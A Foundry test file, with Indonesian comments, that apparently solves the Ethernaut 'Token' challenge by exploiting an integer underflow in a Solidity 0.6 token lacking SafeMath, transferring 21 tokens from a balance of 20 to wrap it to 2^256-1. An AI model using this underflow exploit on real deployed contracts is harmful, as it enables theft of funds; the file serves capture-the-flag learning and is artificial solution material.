// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interaksi lewat interface + deployCode: kontrak level 0.6 tidak bisa
// di-import langsung ke file test 0.8 (konflik versi solc dalam satu unit
// kompilasi), dan forge-std Test.sol tidak bisa dikompilasi dengan solc 0.6.
interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256);
}

interface ITokenFactory {
    function createInstance(address _player) external payable returns (address);
    function validateInstance(address payable _instance, address _player) external returns (bool);
}

contract TokenSolve is Test {
    ITokenFactory factory;
    IToken instance;
    address player = address(0xBEEF);
    address recipient = address(0x1234);

    function setUp() public {
        factory = ITokenFactory(deployCode("TokenFactory.sol:TokenFactory"));
        instance = IToken(factory.createInstance(player));
    }

    function testInit() public {
        assertEq(instance.balanceOf(player), 20);
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // Solidity 0.6 tanpa SafeMath: `balances[msg.sender] - _value` wrap
        // (underflow) dan `require(... >= 0)` selalu benar untuk uint256.
        // Transfer 21 dari saldo 20 -> saldo jadi 2^256 - 1.
        instance.transfer(recipient, 21);
        vm.stopPrank();
        assertGt(instance.balanceOf(player), 20);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
